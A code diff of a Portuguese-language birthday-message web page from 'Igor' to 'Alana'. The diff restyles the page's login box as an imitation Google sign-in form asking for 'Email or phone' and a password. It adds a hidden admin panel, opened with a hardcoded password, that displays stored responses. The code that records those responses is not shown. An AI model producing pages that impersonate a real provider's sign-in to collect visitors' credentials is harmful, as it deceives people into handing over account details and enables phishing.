@@ -6,45 +6,90 @@
   <title>Mensagem Especial</title>
   <style>
     body {
-      font-family: 'Georgia', serif;
-      background: url('https://i.ibb.co/VYRzQXw7/flores-rosas.jpg') no-repeat center center fixed;
-      background-size: cover;
+      font-family: 'Roboto', Arial, sans-serif;
+      background-color: #f8f9fa;
       margin: 0;
       padding: 0;
       display: flex;
       justify-content: center;
       align-items: center;
       min-height: 100vh;
+      color: #202124;
     }
-    .container {
-      background-color: rgba(255, 255, 255, 0.85);
-      padding: 30px;
-      border-radius: 15px;
-      max-width: 500px;
+    .logo {
       text-align: center;
-      box-shadow: 0 5px 25px rgba(0, 0, 0, 0.1);
-      backdrop-filter: blur(4px);
-      border: 1px solid rgba(255, 255, 255, 0.4);
-      margin: 20px;
+      margin-bottom: 20px;
+    }
+    .logo h1 {
+      color: #4285F4;
+      font-size: 24px;
+      font-weight: 500;
+    }
+    .login-box {
+      background-color: white;
+      width: 368px;
+      padding: 48px 40px 36px;
+      border-radius: 8px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+      text-align: center;
+    }
+    .login-title {
+      font-size: 24px;
+      font-weight: 400;
+      margin-bottom: 10px;
+    }
+    .login-subtitle {
+      font-size: 16px;
+      color: #5f6368;
+      margin-bottom: 40px;
     }
     .login-input {
       width: 100%;
-      padding: 12px;
-      margin: 10px 0;
-      border: 2px solid #e91e63;
-      border-radius: 5px;
+      padding: 13px 15px;
+      margin-bottom: 20px;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
       font-size: 16px;
+      outline: none;
+      transition: border 0.3s;
+    }
+    .login-input:focus {
+      border: 1px solid #4285F4;
     }
     .login-btn {
-      background: linear-gradient(to right, #c2185b, #e91e63);
+      width: 100%;
+      background-color: #4285F4;
       color: white;
       border: none;
-      padding: 12px 30px;
-      border-radius: 50px;
+      padding: 10px 24px;
+      border-radius: 4px;
+      font-size: 14px;
+      font-weight: 500;
       cursor: pointer;
-      font-size: 1em;
-      box-shadow: 0 4px 15px rgba(194, 24, 91, 0.3);
-      margin: 5px;
+      margin-top: 10px;
+      height: 36px;
+      transition: background-color 0.3s;
+    }
+    .login-btn:hover {
+      background-color: #3367d6;
+    }
+    .guest-mode {
+      color: #5f6368;
+      font-size: 14px;
+      margin-top: 30px;
+    }
+    .guest-mode a {
+      color: #4285F4;
+      text-decoration: none;
+    }
+    .create-account {
+      margin-top: 30px;
+      font-size: 14px;
+    }
+    .create-account a {
+      color: #4285F4;
+      text-decoration: none;
+      font-weight: 500;
     }
     #admin-panel {
       background: rgba(255,240,245,0.9);
@@ -57,18 +102,30 @@
       white-space: pre-line;
       text-align: left;
     }
+    .hidden {
+      display: none;
+    }
   </style>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
 </head>
 <body>
-  <div class="container" id="login-container">
-    <h1>Acesso ao Recado Especial</h1>
-    <input type="text" class="login-input" id="username" placeholder="Digite seu nome" required>
-    <input type="password" class="login-input" id="password" placeholder="Digite sua senha" required>
-    <button class="login-btn" onclick="verMensagem()">Ver Mensagem</button>
-    <button class="login-btn" onclick="acessoAdmin()" style="background:linear-gradient(to right, #4b6cb7, #182848)">Modo Admin</button>
+  <div class="login-box" id="login-container">
+    <div class="logo">
+      <h1>Google</h1>
+    </div>
+    <h2 class="login-title">Sign in</h2>
+    <p class="login-subtitle">to continue to your special message</p>
+    
+    <input type="text" class="login-input" id="username" placeholder="Email or phone">
+    <input type="password" class="login-input" id="password" placeholder="Enter your password">
+    
+    <button class="login-btn" onclick="verMensagem()">Next</button>
+    
+    <p class="guest-mode">Not your computer? <a href="#" onclick="verMensagem()">Use Guest mode</a></p>
+    <p class="create-account"><a href="#" onclick="verMensagem()">Create account</a></p>
   </div>
 
-  <div class="container" id="mensagem-container" style="display:none">
+  <div class="login-box" id="mensagem-container" style="display:none">
     <h1>Feliz Aniversário Alana!</h1>
     <p>Numa época em que um "bom dia" com emoji já é considerado investida romântica, você merece muito mais do que esses amores modernos de mensagem rápida.</p>
     <p>Você é daquelas pessoas que deveria receber flores sem motivo, cartas escritas à mão com a letra tremendo de nervoso, serenatas à sua porta e convites pra dançar na sala de casa mesmo sem música tocando.</p>
@@ -76,13 +133,13 @@
     <p>Neste seu dia, desejo que encontre tudo o que merece. Apesar da nossa amizade não ter surgido um amor verdadeiro, como você mesma disse um dia, saiba que o que sinto por você só se transformou num carinho mais maduro. Enfrentaria tudo por você exceto a sua felicidade, estarei aqui para o que precisar.</p>
     <p><strong>Com carinho, Igor ♥</strong></p>
 
-    <iframe style="border-radius:12px" src="https://open.spotify.com/embed/track/52yEAOTPaQzW5vcqFKu6Du?utm_source=generator" width="100%" height="80" frameBorder="0" allowfullscreen allow="autoplay; clipboard-write; encrypted-media; fullscreen; picture-in-picture"></iframe>
+    <iframe style="border-radius:12px; margin-top:20px" src="https://open.spotify.com/embed/track/52yEAOTPaQzW5vcqFKu6Du?utm_source=generator" width="100%" height="80" frameBorder="0" allowfullscreen allow="autoplay; clipboard-write; encrypted-media; fullscreen; picture-in-picture"></iframe>
     
     <!-- Painel Admin (só visível para Igor) -->
     <div id="admin-panel">
       <h3>Respostas Registradas</h3>
       <div id="respostas"></div>
-      <button onclick="limparDados()" style="background:#ff4757; margin-top:10px">Limpar Dados</button>
+      <button class="login-btn" onclick="limparDados()" style="background:#ff4757; margin-top:10px">Limpar Dados</button>
     </div>
   </div>
 
@@ -101,24 +158,14 @@
         // Mostra a mensagem
         document.getElementById('login-container').style.display = 'none';
         document.getElementById('mensagem-container').style.display = 'block';
+        
+        // Se for o admin, mostra o painel
+        if (nome === "Igor" && senha === "123") {
+          document.getElementById('admin-panel').style.display = 'block';
+          document.getElementById('respostas').textContent = localStorage.getItem('respostas') || "Nenhuma resposta ainda.";
+        }
       } else {
         alert("Por favor, preencha ambos os campos!");
-      }
-    }
-
-    // Função especial para o Igor (admin)
-    function acessoAdmin() {
-      const nome = document.getElementById('username').value.trim();
-      const senha = document.getElementById('password').value.trim();
-
-      if (nome === "Igor" && senha === "123") {
-        verMensagem(); // Mostra a mensagem normal
-        
-        // Exibe o painel admin com todas as respostas
-        document.getElementById('admin-panel').style.display = 'block';
-        document.getElementById('respostas').textContent = localStorage.getItem('respostas') || "Nenhuma resposta ainda.";
-      } else {
-        alert("Credenciais admin incorretas!");
       }
     }
 
